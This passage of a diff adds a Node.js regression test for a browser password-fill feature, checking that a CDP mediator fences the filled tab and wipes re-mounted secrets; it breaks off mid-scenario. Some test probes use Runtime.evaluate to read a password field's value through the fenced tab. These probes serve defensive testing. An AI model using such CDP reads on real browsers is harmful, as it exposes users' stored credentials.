@@ -1,0 +1,1383 @@
+#!/usr/bin/env node
+/**
+ * Round 30 regression nails for `vault-login` (8 closing-list items `R30-1`..`R30-8` + 3 extra driven scenes `R30-X1`..`R30-X3`):
+ *   - R30-1: Item 1 — Fence affects ONLY the fenced tab, ONLY while it is fenced; sessionless non-tab CDP calls,
+ *     sessionless tab-named calls on unfenced tabs, and wrapped `Target.sendMessageToTarget` on unfenced tabs (same
+ *     conversation & other conversations) succeed identically to `master`, while calls naming the fenced tab or an
+ *     unknown inner session while fenced are refused (`login_fill_live`).
+ *   - R30-2: Item 2 — Tab becomes readable again as soon as the value is verifiably gone (next agent read re-runs the
+ *     check, lifts when verified empty, and keeps the ordinary ceiling timer); when a check cannot inspect the tab
+ *     (`!wr.ok`), it answers `409 login_check_failed` (`"VibeSpace could not check this tab — try again"`), arms no
+ *     permanent fence, files 0 `"could not be cleared"` For-you notices, and recovers on the next healthy read.
+ *   - R30-3: Item 3 — Channel-fact fallback copy in `browser-dialogs.js` deleted: a keeper without `loginChannelFor`
+ *     refuses `409 login_channel_unmediated` (`0` `Input.insertText` calls), and restated `P5` holds on real
+ *     `browser-keeper` (local named profiles on `owner`/`instance` roads hand ONLY mediated proxy URLs, never raw CDP).
+ *   - R30-4: Item 4 — Post-lift guards survive Hub restart (`guards` persisted in `browser-profiles.json` with 0 secret
+ *     bytes and 0 digests) and recheck on the very first read after restart (`liftshort` `< 8`-byte & `liftlong` `>= 8`-byte).
+ *   - R30-5: Item 5 — Road mode census (`R29-1d`) catches string-literal `mode: 'relay'` reusing existing `why: 'shared'`
+ *     (mutant `M6b`) and enforces `mode` in `{'mediated', 'scope', null}`.
+ *   - R30-6: Item 6 — One two-step code pace answer shape across BOTH agent doors (`GET /api/agent/vault/totp/:name`
+ *     and `POST /api/agent/browser/fill-vault`): HTTP `429`, `code: 'code_paced'`, single sentence with `secondsLeft`
+ *     and `retryInMs`.
+ *   - R30-7: Item 7 — `vibespace-vault --help` on `--kind login` states where login requests/fills work (local mediated
+ *     named browser profile via `vibespace-browser use <profile>`, not the temporary browser).
+ *   - R30-8: Item 8 — `docs/kb-bugfix-invariants.md` preserves `master`'s exact unrelated wording and blank line.
+ *   - R30-X1: Extra scene 1 — Page re-mounts filled secret into a brand-new `<input>` element (`createElement` + `appendChild`).
+ *   - R30-X2: Extra scene 2 — Job token (`jbt_`) path through real routes + real `browser-keeper` `loginChannelFor`.
+ *   - R30-X3: Extra scene 3 — `fake-kernel.mjs` custom-kernel mode (`mode: { standard: false }`).
+ */
+import fs from 'node:fs';
+import os from 'node:os';
+import path from 'node:path';
+import http from 'node:http';
+import crypto from 'node:crypto';
+import { spawnSync } from 'node:child_process';
+import { createRequire } from 'node:module';
+import { fileURLToPath, pathToFileURL } from 'node:url';
+
+const SELF_PATH = fileURLToPath(import.meta.url);
+const quiet = { log() {}, warn() {}, error() {} };
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+async function startKernelRelay(fk) {
+  const { WebSocketServer, WebSocket } = createRequire(import.meta.url)('ws');
+  const state = {
+    upstreamCalls: [],
+    hook: null,
+  };
+  let relayPort = 0;
+  const relayHttp = http.createServer((req, res) => {
+    http.get({ host: '127.0.0.1', port: fk.port, path: req.url }, (upRes) => {
+      let body = '';
+      upRes.setEncoding('utf8');
+      upRes.on('data', (d) => { body += d; });
+      upRes.on('end', () => {
+        const rewritten = body.replaceAll(`127.0.0.1:${fk.port}`, `127.0.0.1:${relayPort}`);
+        res.writeHead(upRes.statusCode || 200, { 'Content-Type': 'application/json' });
+        res.end(rewritten);
+      });
+    }).on('error', () => {
+      res.writeHead(502);
+      res.end();
+    });
+  });
+  const wss = new WebSocketServer({ noServer: true });
+  relayHttp.on('upgrade', (req, sock, head) => {
+    const upUrl = `ws://127.0.0.1:${fk.port}${req.url}`;
+    const upWs = new WebSocket(upUrl);
+    upWs.once('open', () => {
+      wss.handleUpgrade(req, sock, head, (clientWs) => {
+        const sendToClient = (obj) => {
+          if (clientWs.readyState === WebSocket.OPEN) {
+            try { clientWs.send(JSON.stringify(obj)); } catch { /* gone */ }
+          }
+        };
+        upWs.on('message', (raw) => {
+          if (clientWs.readyState === WebSocket.OPEN) {
+            try { clientWs.send(String(raw)); } catch { /* gone */ }
+          }
+        });
+        upWs.on('close', () => { try { clientWs.close(); } catch { /* gone */ } });
+        clientWs.on('message', async (raw) => {
+          const text = String(raw);
+          let msg = null;
+          try { msg = JSON.parse(text); } catch { /* raw */ }
+          if (msg && msg.method) state.upstreamCalls.push(msg);
+          if (state.hook && msg) {
+            const handled = await state.hook(msg, { sendToClient, upWs });
+            if (handled === true) return;
+          }
+          if (upWs.readyState === WebSocket.OPEN) {
+            try { upWs.send(text); } catch { /* gone */ }
+          }
+        });
+        clientWs.on('close', () => { try { upWs.close(); } catch { /* gone */ } });
+      });
+    });
+    upWs.on('error', () => { try { sock.destroy(); } catch { /* gone */ } });
+  });
+  await new Promise((r) => relayHttp.listen(0, '127.0.0.1', r));
+  relayPort = relayHttp.address().port;
+  return {
+    port: relayPort,
+    wsUrl: `ws://127.0.0.1:${relayPort}/devtools/browser/fake-kernel`,
+    state,
+    async close() {
+      for (const c of wss.clients) { try { c.terminate(); } catch { /* */ } }
+      await new Promise((r) => relayHttp.close(r));
+    },
+  };
+}
+
+async function openCdpClient(WebSocket, wsUrl) {
+  const ws = new WebSocket(wsUrl);
+  await new Promise((res, rej) => { ws.once('open', res); ws.once('error', rej); });
+  let seq = 0;
+  const pending = new Map();
+  const innerReplies = new Map();
+  ws.on('message', (raw) => {
+    let m = null;
+    try { m = JSON.parse(String(raw)); } catch { return; }
+    if (m.id && pending.has(m.id)) {
+      const fn = pending.get(m.id);
+      pending.delete(m.id);
+      fn(m);
+      return;
+    }
+    if (m.method === 'Target.receivedMessageFromTarget' && m.params && typeof m.params.message === 'string') {
+      try {
+        const inner = JSON.parse(m.params.message);
+        if (inner && inner.id && innerReplies.has(inner.id)) {
+          const fn = innerReplies.get(inner.id);
+          innerReplies.delete(inner.id);
+          fn(inner);
+        }
+      } catch { /* ignore */ }
+    }
+  });
+  const call = (method, params = {}, sessionId = undefined, timeoutMs = 2000) => new Promise((resolve) => {
+    const id = ++seq;
+    const timer = setTimeout(() => { pending.delete(id); resolve({ id, timeout: true }); }, timeoutMs);
+    pending.set(id, (msg) => { clearTimeout(timer); resolve(msg); });
+    const payload = { id, method, params };
+    if (sessionId) payload.sessionId = sessionId;
+    try { ws.send(JSON.stringify(payload)); } catch (e) { clearTimeout(timer); pending.delete(id); resolve({ id, error: { message: String(e) } }); }
+  });
+  const callWrapped = async (innerSid, method, params = {}, timeoutMs = 1200) => {
+    const innerId = 10_000 + (++seq);
+    const innerP = new Promise((resolve) => {
+      const timer = setTimeout(() => { innerReplies.delete(innerId); resolve({ timeout: true }); }, timeoutMs);
+      innerReplies.set(innerId, (msg) => { clearTimeout(timer); resolve(msg); });
+    });
+    const outer = await call('Target.sendMessageToTarget', {
+      sessionId: innerSid,
+      message: JSON.stringify({ id: innerId, method, params }),
+    }, undefined, timeoutMs);
+    if (outer.error || outer.timeout) {
+      innerReplies.delete(innerId);
+      return { outer, inner: null };
+    }
+    const inner = await innerP;
+    return { outer, inner };
+  };
+  const evalOnTarget = async (targetId, expression) => {
+    const att = await call('Target.attachToTarget', { targetId, flatten: true });
+    const sid = att.result?.sessionId;
+    const iw = await call('Page.createIsolatedWorld', { frameId: targetId, worldName: 'oracle' }, sid);
+    const contextId = iw.result?.executionContextId;
+    const r = await call('Runtime.evaluate', { expression, contextId, returnByValue: true }, sid);
+    await call('Target.detachFromTarget', { sessionId: sid }).catch(() => {});
+    return r.result?.result?.value;
+  };
+  return {
+    ws,
+    call,
+    callWrapped,
+    evalOnTarget,
+    close() { try { ws.close(); } catch { /* gone */ } },
+  };
+}
+
+function installFakeAgentBrowser(binDir, abStateDir) {
+  fs.mkdirSync(binDir, { recursive: true, mode: 0o700 });
+  fs.mkdirSync(abStateDir, { recursive: true, mode: 0o700 });
+  const script = `#!${process.execPath}
+const fs = require('fs'), path = require('path'), { spawn } = require('child_process');
+const st = process.env.FAKE_AB_STATE;
+const ns = process.env.AGENT_BROWSER_NAMESPACE || 'default';
+const f = path.join(st, ns + '.json');
+const read = () => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return null; } };
+const alive = (pid) => { try { process.kill(pid, 0); return true; } catch { return false; } };
+const out = (o) => { process.stdout.write(JSON.stringify(o) + '\\n'); };
+const argv = process.argv.slice(2).filter((x) => x !== '--pin-tab');
+const [a, b] = argv;
+if (a === '--version') { console.log('agent-browser 0.38.2'); process.exit(0); }
+if (a === 'session' && b === 'info') {
+  const s = read();
+  const act = !!(s && alive(s.pid));
+  out({ success: true, data: { active: act, namespace: ns, pid: act ? s.pid : null, session: process.env.AGENT_BROWSER_SESSION || null, socketDir: path.join(st, ns, 'run') } });
+  process.exit(0);
+}
+if (a === 'open') {
+  let s = read();
+  if (!(s && alive(s.pid))) {
+    const c = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 120000)'], { detached: true, stdio: 'ignore' });
+    c.unref();
+    s = { pid: c.pid, profile: process.env.AGENT_BROWSER_PROFILE || null, cdp: process.env.AGENT_BROWSER_CDP || null };
+    fs.writeFileSync(f, JSON.stringify(s));
+  }
+  out({ success: true, data: { url: b } });
+  process.exit(0);
+}
+if (a === 'get' && b === 'cdp-url') {
+  const s = read();
+  if (!(s && alive(s.pid))) { out({ success: false, error: 'fake: no browser' }); process.exit(1); }
+  out({ success: true, data: { cdpUrl: process.env.FAKE_CDP_URL } });
+  process.exit(0);
+}
+if (a === 'tab' && b === 'new') {
+  out({ success: true, data: { targetId: process.env.FAKE_TARGET_ID || 'T-1', url: 'about:blank' } });
+  process.exit(0);
+}
+if (a === 'tab') {
+  out({ success: true, data: { active: b || '0' } });
+  process.exit(0);
+}
+if (a === 'close') {
+  const s = read();
+  if (s && s.pid) { try { process.kill(s.pid, 'SIGTERM'); } catch {} }
+  try { fs.unlinkSync(f); } catch {}
+  out({ success: true, data: { closed: true } });
+  process.exit(0);
+}
+out({ success: true, data: {} });
+`;
+  const p = path.join(binDir, 'agent-browser');
+  fs.writeFileSync(p, script, { mode: 0o755 });
+  return p;
+}
+
+export async function runR30LoginNails({ repoDir, ok }) {
+  const req = createRequire(path.join(repoDir, 'package.json'));
+  const express = req('express');
+  const { WebSocket } = req('ws');
+  const BM = req('./src/browser-mediation.js');
+  const BF = req('./src/browser-facts.js');
+  const LF = req('./src/server/browser-login-fill.js');
+  const VE = req('./src/server/vault-engine.js');
+  const VT = req('./src/server/vault-totp.js');
+  const GS = req('./src/server/grants-store.js');
+  const BK = req('./src/server/browser-keeper.js');
+  const Lm = req('./src/server/browser-logins.js');
+  const Dm = req('./src/server/browser-dialogs.js');
+  const CM = req('./src/server/cdp-mediator.js');
+  const Rm = req('./src/routes/browser.js');
+  const VRm = req('./src/routes/vault.js');
+  const { startFakeKernel } = await import(pathToFileURL(path.join(repoDir, 'scripts/fixtures/fake-kernel.mjs')).href);
+
+  console.log('⑩ Round 30 regression nails (closing list R30-1..R30-8 + 3 extra driven scenes R30-X1..R30-X3)');
+
+  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'vs-r30-nails-'));
+  try {
+    // ──────────────────────────────────────────────────────────────────────────
+    // R30-1: Item 1 — Fence affects ONLY the fenced tab while fenced
+    // ──────────────────────────────────────────────────────────────────────────
+    {
+      const ORIGIN = 'https://item1r30.example.test';
+      const PW = 'Item1TabOnly!2026_R30';
+      const dataDir = path.join(tmpRoot, 'd-r30-1');
+      const homeDir = path.join(tmpRoot, 'h-r30-1');
+      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
+      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
+
+      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/login`, mode: { standard: true, omitFilledPassword: true } });
+      const tidA = fk.targets()[0].targetId;
+      const tidB = fk.addTarget(`${ORIGIN}/other`);
+      const tidC = fk.addTarget(`${ORIGIN}/conv2`);
+      fk.setDom(tidA, { url: `${ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
+      fk.setDom(tidB, { url: `${ORIGIN}/other`, elements: [{ id: 'ok', tag: 'div', text: 'Other Tab' }] });
+      fk.setDom(tidC, { url: `${ORIGIN}/conv2`, elements: [{ id: 'ok2', tag: 'div', text: 'Second Conv' }] });
+      const relay = await startKernelRelay(fk);
+      const med = CM.create({ log: quiet });
+      await med.listen();
+
+      const KEY_A = 'bk-0000301a';
+      const KEY_B = 'bk-0000301b';
+      const keeper = BK.create({
+        dataDir,
+        homeDir,
+        env: () => ({ HOME: homeDir }),
+        liveKeys: () => new Set([KEY_A, KEY_B]),
+        log: quiet,
+        install: false,
+        mediator: med,
+      });
+      const prof = keeper.createProfile({ label: 'R30TabScope', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
+      const PID = prof.id;
+      const grantA = await med.grantFor({ profileId: PID, browserKey: KEY_A, upstream: relay.wsUrl, targetIds: [tidA, tidB], mode: 'scope' });
+      const grantB = await med.grantFor({ profileId: PID, browserKey: KEY_B, upstream: relay.wsUrl, targetIds: [tidC], mode: 'scope' });
+
+      const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
+      await vault.setup('r30-1-pw');
+      const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
+      const logins = Lm.create({ vault, grants: () => grants, log: quiet.log });
+      logins.addOwn({ origin: ORIGIN, username: 'alice', password: PW }, { who: 'owner' });
+      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });
+
+      const keeperWrap = {
+        ...keeper,
+        cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: relay.wsUrl } : { ok: false }),
+      };
+      const dialogs = Dm.create({
+        keeper: keeperWrap,
+        logins,
+        holdersOf: () => [{ browserKey: KEY_A, sessionId: 's-a' }, { browserKey: KEY_B, sessionId: 's-b' }],
+        leaseCountOf: () => 2,
+        log: quiet,
+      });
+      try {
+        await dialogs.arm(PID);
+        dialogs.bindTab?.({ profileId: PID, browserKey: KEY_A }, tidA);
+        dialogs.bindTab?.({ profileId: PID, browserKey: KEY_A }, tidB);
+        dialogs.bindTab?.({ profileId: PID, browserKey: KEY_B }, tidC);
+        dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY_A }, tidA);
+
+        const wsA = await openCdpClient(WebSocket, grantA.url);
+        const wsB = await openCdpClient(WebSocket, grantB.url);
+        const attA = await wsA.call('Target.attachToTarget', { targetId: tidA, flatten: false });
+        const attB = await wsA.call('Target.attachToTarget', { targetId: tidB, flatten: false });
+        const attC = await wsB.call('Target.attachToTarget', { targetId: tidC, flatten: false });
+        const sidA = attA.result?.sessionId;
+        const sidB = attB.result?.sessionId;
+        const sidC = attC.result?.sessionId;
+
+        const fillRes = await dialogs.fillVaultField(
+          { profileId: PID, browserKey: KEY_A },
+          { target: '#pw', spec: 'item1r30.example.test#alice/password', targetId: tidA, facts: { conversationKeys: [KEY_A] } },
+        );
+
+        const cCookies = await wsA.call('Storage.getCookies', {});
+        const cDownload = await wsA.call('Browser.setDownloadBehavior', { behavior: 'deny' });
+        const cWinB = await wsA.call('Browser.getWindowForTarget', { targetId: tidB });
+        const cWinA = await wsA.call('Browser.getWindowForTarget', { targetId: tidA });
+        const wrapUnfencedSameConv = await wsA.call('Target.sendMessageToTarget', {
+          sessionId: sidB,
+          message: JSON.stringify({ id: 11, method: 'Runtime.evaluate', params: { expression: '1+1', returnByValue: true } }),
+        });
+        const wrapUnfencedOtherConv = await wsB.call('Target.sendMessageToTarget', {
+          sessionId: sidC,
+          message: JSON.stringify({ id: 12, method: 'Runtime.evaluate', params: { expression: '2+2', returnByValue: true } }),
+        });
+        const wrapFenced = await wsA.call('Target.sendMessageToTarget', {
+          sessionId: sidA,
+          message: JSON.stringify({ id: 13, method: 'Runtime.evaluate', params: { expression: 'document.querySelector("#pw").value', returnByValue: true } }),
+        });
+        const wrapInnerParamFenced = await wsA.call('Target.sendMessageToTarget', {
+          sessionId: sidB,
+          message: JSON.stringify({ id: 14, method: 'Browser.getWindowForTarget', params: { targetId: tidA } }),
+        });
+        const wrapUnknown = await wsA.call('Target.sendMessageToTarget', {
+          sessionId: 'sid-unknown-999',
+          message: JSON.stringify({ id: 15, method: 'Runtime.evaluate', params: { expression: '1', returnByValue: true } }),
+        });
+
+        wsA.close();
+        wsB.close();
+
+        const noLeak = !JSON.stringify({ wrapFenced, wrapInnerParamFenced, wrapUnknown, cWinA }).includes(PW);
+        ok(
+          fillRes.ok === true
+            && !cCookies.error && !cCookies.timeout
+            && !cDownload.error && !cDownload.timeout
+            && !cWinB.error && !cWinB.timeout
+            && Boolean(cWinA.error && /login_fill_live/.test(cWinA.error.message || ''))
+            && !wrapUnfencedSameConv.error && Boolean(wrapUnfencedSameConv.result)
+            && !wrapUnfencedOtherConv.error && Boolean(wrapUnfencedOtherConv.result)
+            && Boolean(wrapFenced.error && /login_fill_live/.test(wrapFenced.error.message || ''))
+            && Boolean(wrapInnerParamFenced.error && /login_fill_live/.test(wrapInnerParamFenced.error.message || ''))
+            && Boolean(wrapUnknown.error && /login_fill_live/.test(wrapUnknown.error.message || ''))
+            && noLeak,
+          'R30-1 (Item 1 fenced-tab-only isolation): sessionless non-tab calls, sessionless unfenced-tab calls, and wrapped Target.sendMessageToTarget on unfenced tabs (same & other conv) succeed while fenced-tab and unknown-inner-session calls refuse login_fill_live',
+          { cCookies, cDownload, cWinB, cWinA, wrapUnfencedSameConv, wrapUnfencedOtherConv, wrapFenced, wrapInnerParamFenced, wrapUnknown },
+        );
+      } finally {
+        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
+        dialogs.shutdown();
+        keeper.shutdown();
+        vault.close();
+        await med.shutdown();
+        await relay.close();
+        await fk.close();
+      }
+    }
+
+    // ──────────────────────────────────────────────────────────────────────────
+    // R30-2 & R30-X1: Item 2 (readable when verifiably gone + honest check_failed) & Extra Scene 1 (new <input> node)
+    // ──────────────────────────────────────────────────────────────────────────
+    {
+      const ORIGIN = 'https://item2r30.example.test';
+      const PW = 'Item2LiftCheck!2026_R30';
+      const dataDir = path.join(tmpRoot, 'd-r30-2');
+      const homeDir = path.join(tmpRoot, 'h-r30-2');
+      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
+      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
+      let clock = 1_765_500_000_000;
+
+      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/login`, mode: { standard: true, omitFilledPassword: true } });
+      const tid = fk.targets()[0].targetId;
+      fk.setDom(tid, { url: `${ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
+      const relay = await startKernelRelay(fk);
+      const med = CM.create({ log: quiet });
+      await med.listen();
+
+      const KEY = 'bk-0000302a';
+      const SID = 'sess-r30-2';
+      const TOKEN = 'vsst_r30_2_' + crypto.randomBytes(8).toString('hex');
+      const fyItems = [];
+      const forYou = {
+        add: (_pid, item) => { const id = 'fy-' + (fyItems.length + 1); fyItems.push({ id, status: 'open', ...item }); return id; },
+        resolve: (id) => { const f = fyItems.find((x) => x.id === id); if (f) f.status = 'resolved'; },
+      };
+
+      const keeper = BK.create({
+        dataDir,
+        homeDir,
+        env: () => ({ HOME: homeDir }),
+        liveKeys: () => new Set([KEY]),
+        log: quiet,
+        now: () => clock,
+        install: false,
+        mediator: med,
+      });
+      const prof = keeper.createProfile({ label: 'R30LiftProf', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
+      const PID = prof.id;
+      const grant = await med.grantFor({ profileId: PID, browserKey: KEY, upstream: relay.wsUrl, targetIds: [tid], mode: 'scope' });
+
+      const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
+      await vault.setup('r30-2-pw');
+      const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
+      const logins = Lm.create({ vault, grants: () => grants, forYou, now: () => clock, log: quiet.log });
+      logins.addOwn({ origin: ORIGIN, username: 'alice', password: PW }, { who: 'owner' });
+      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });
+
+      const keeperWrap = {
+        ...keeper,
+        cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: relay.wsUrl } : { ok: false }),
+        leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID, targetId: tid }],
+        statusFor: () => ({ ephemeral: null, pin: PID, leases: [{ profileId: PID, alias: 'shop', isDefault: true }] }),
+        setFor: () => ({ defaultId: PID, attachments: [{ profileId: PID, alias: 'shop', label: prof.label, isDefault: true }], handles: ['shop'] }),
+        resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: PID, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
+        attach: async () => ({ ok: true, profile: prof, browser: { state: 'ready' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, cdpUrl: grant.url, env: [`AGENT_BROWSER_CDP=${grant.url}`], pinTab: false, others: 0 }),
+      };
+      const dialogs = Dm.create({
+        keeper: keeperWrap,
+        logins,
+        forYou,
+        now: () => clock,
+        liveFillMaxMs: 250,
+        holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
+        leaseCountOf: () => 1,
+        conversationOf: () => ({ cid: 'conv-r30-2', name: 'Agent R30-2' }),
+        log: quiet,
+      });
+      const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Agent R30-2', cwd: tmpRoot, backendSessionId: 'conv-r30-2' }]]);
+      Rm.setup({ keeper: keeperWrap, activeSessions: sessions, dialogs, logins, tasksForSession: () => [] });
+      const app = express();
+      app.use(express.json());
+      app.use(Rm.router);
+      const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
+      const rawWs = await openCdpClient(WebSocket, relay.wsUrl);
+      try {
+        const pageEval = (expr) => rawWs.evalOnTarget(tid, expr);
+        const base = `http://127.0.0.1:${srv.address().port}`;
+        const post = async (u, body) => {
+          const r = await fetch(base + u, {
+            method: 'POST',
+            headers: { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` },
+            body: JSON.stringify(body),
+          });
+          return { status: r.status, json: await r.json() };
+        };
+        const rd = (argv) => post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv, targetId: tid });
+
+        await dialogs.arm(PID);
+        dialogs.bindTab?.({ profileId: PID, browserKey: KEY }, tid);
+        dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tid);
+
+        // Fill #pw and lift via ceiling
+        const f1 = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'item2r30.example.test#alice/password', targetId: tid });
+        clock += 500;
+        await rd(['get', 'title']);
+        await sleep(80);
+        const afterLift = await rd(['get', 'value', '#pw']);
+
+        // Part A: Page puts PW back -> read #1 wipes & refuses 409 login_fill_live -> read #2 verifies empty & returns 200!
+        await pageEval(`(() => { const n = document.querySelector('#pw'); n.value = ${JSON.stringify(PW)}; return 1; })()`);
+        const refillRead1 = await rd(['get', 'value', '#pw']);
+        const domAfterRead1 = fk.readDomValues(tid).pw;
+        const refillRead2 = await rd(['get', 'title']);
+        const openFyAfterLift = fyItems.filter((x) => x.status === 'open');
+
+        // Also verify ordinary ceiling timer still runs on a postLiftHeld fence when unread:
+        await pageEval(`(() => { const n = document.querySelector('#pw'); n.value = ${JSON.stringify(PW)}; return 1; })()`);
+        const refillRead3 = await rd(['get', 'value', '#pw']);
+        const heldBeforeCeiling = Boolean(dialogs.liveFillOnTarget(PID, tid));
+        clock += 500;
+        await sleep(310);
+        const heldAfterCeiling = dialogs.liveFillOnTarget(PID, tid);
+
+        // Part B: Recheck fails once (`Runtime.evaluate` + `Page.getFrameTree` error) -> 409 login_check_failed, 0 For-you, next read 200!
+        let failEval = 1, failTree = 1;
+        relay.state.hook = (m, { sendToClient }) => {
+          if (m.method === 'Runtime.evaluate' && failEval > 0) {
+            failEval--;
+            sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code: -32000, message: 'Execution context was destroyed.' } });
+            return true;
+          }
+          if (m.method === 'Page.getFrameTree' && failTree > 0) {
+            failTree--;
+            sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code: -32000, message: 'busy' } });
+            return true;
+          }
+          return false;
+        };
+        const checkFailRead = await rd(['get', 'title']);
+        relay.state.hook = null;
+        const fenceAfterCheckFail = dialogs.liveFillOnTarget(PID, tid);
+        const openFyAfterCheckFail = fyItems.filter((x) => x.status === 'open');
+        const nextHealthyRead = await rd(['get', 'title']);
+        const failErr = String(checkFailRead.json?.error || '');
+
+        ok(
+          f1.status === 200
+            && afterLift.status === 200
+            && refillRead1.status === 409 && refillRead1.json?.code === 'login_fill_live' && domAfterRead1 === ''
+            && refillRead2.status === 200
+            && openFyAfterLift.length === 0
+            && refillRead3.status === 409 && heldBeforeCeiling === true && heldAfterCeiling === null
+            && checkFailRead.status === 409 && checkFailRead.json?.code === 'login_check_failed'
+            && /could not check this tab\s*[—-]\s*try again/i.test(failErr)
+            && !/currently filling|could not be cleared/i.test(failErr)
+            && fenceAfterCheckFail === null
+            && openFyAfterCheckFail.length === 0
+            && nextHealthyRead.status === 200,
+          'R30-2 (Item 2 readable once gone + honest check_failed): post-lift refill wipes on read #1 (0 For-you notices), lifts to 200 on read #2 (and at ceiling), and failed check returns 409 login_check_failed without locking the empty tab',
+          { refillRead1, domAfterRead1, refillRead2, openFyAfterLift, heldBeforeCeiling, heldAfterCeiling, checkFailRead, fenceAfterCheckFail, nextHealthyRead },
+        );
+
+        // R30-X1: Page re-mounts filled secret into a brand-new <input id="pw2"> via createElement + appendChild!
+        const mkNewNode = await pageEval(`(() => {
+          const old = document.querySelector('#pw');
+          if (old && old.remove) old.remove();
+          const n = document.createElement('input');
+          n.id = 'pw2';
+          n.type = 'password';
+          n.value = ${JSON.stringify(PW)};
+          document.body.appendChild(n);
+          return Boolean(document.querySelector('#pw2') && document.querySelector('#pw2').value.length === ${PW.length});
+        })()`);
+        const x1Read1 = await rd(['get', 'value', '#pw2']);
+        const x1DomAfter = fk.readDomValues(tid).pw2;
+        const x1Read2 = await rd(['get', 'value', '#pw2']);
+        ok(
+          mkNewNode === true
+            && x1Read1.status === 409 && x1Read1.json?.code === 'login_fill_live'
+            && !JSON.stringify(x1Read1).includes(PW)
+            && x1DomAfter === ''
+            && x1Read2.status === 200,
+          'R30-X1 (Extra scene 1 — new <input> element re-mount): page creating and appending a brand-new #pw2 carrying the filled password triggers 409 login_fill_live, wipes #pw2 to "", and lifts on the next verified-empty read',
+          { mkNewNode, x1Read1, x1DomAfter, x1Read2 },
+        );
+      } finally {
+        rawWs.close();
+        srv.close();
+        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
+        dialogs.shutdown();
+        keeper.shutdown();
+        vault.close();
+        await med.shutdown();
+        await relay.close();
+        await fk.close();
+      }
+    }
+
+    // ──────────────────────────────────────────────────────────────────────────
+    // R30-3: Item 3 — No fallback copy in browser-dialogs.js + restated P5 on real keeper
+    // ──────────────────────────────────────────────────────────────────────────
+    {
+      const ORIGIN = 'https://item3r30.example.test';
+      const PW = 'Item3NoFallback!2026';
+      const dataMed = path.join(tmpRoot, 'd-r30-3m');
+      const dataBare = path.join(tmpRoot, 'd-r30-3b');
+      const homeDir = path.join(tmpRoot, 'h-r30-3');
+      const binDir = path.join(tmpRoot, 'bin-r30-3');
+      const abState = path.join(tmpRoot, 'ab-r30-3');
+      fs.mkdirSync(dataMed, { recursive: true, mode: 0o700 });
+      fs.mkdirSync(dataBare, { recursive: true, mode: 0o700 });
+      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
+      installFakeAgentBrowser(binDir, abState);
+
+      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/login`, mode: { standard: true, omitFilledPassword: true } });
+      const tid = fk.targets()[0].targetId;
+      fk.setDom(tid, { url: `${ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
+      const med = CM.create({ log: quiet });
+      await med.listen();
+
+      const KEY = 'bk-0000303a';
+      const SID = 'sess-r30-3';
+      const TOKEN = 'vsst_r30_3_' + crypto.randomBytes(8).toString('hex');
+      const rtEnv = {
+        FAKE_AB_STATE: abState,
+        FAKE_CDP_URL: fk.wsUrl,
+        FAKE_TARGET_ID: tid,
+        PATH: `${binDir}:${process.env.PATH || '/usr/bin:/bin'}`,
+        HOME: homeDir,
+      };
+      const keeper = BK.create({
+        dataDir: dataMed,
+        homeDir,
+        env: () => rtEnv,
+        liveKeys: () => new Set([KEY]),
+        runtime: BF.createBrowserRuntime({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
+        facts: BF.createBrowserFacts({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
+        log: quiet,
+        install: false,
+        mediator: med,
+      });
+      const bareKeeper = BK.create({
+        dataDir: dataBare,
+        homeDir,
+        env: () => rtEnv,
+        liveKeys: () => new Set([KEY]),
+        runtime: BF.createBrowserRuntime({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
+        facts: BF.createBrowserFacts({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
+        log: quiet,
+        install: false,
+        mediator: null,
+      });
+      const vault = VE.create({ dataDir: dataMed, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
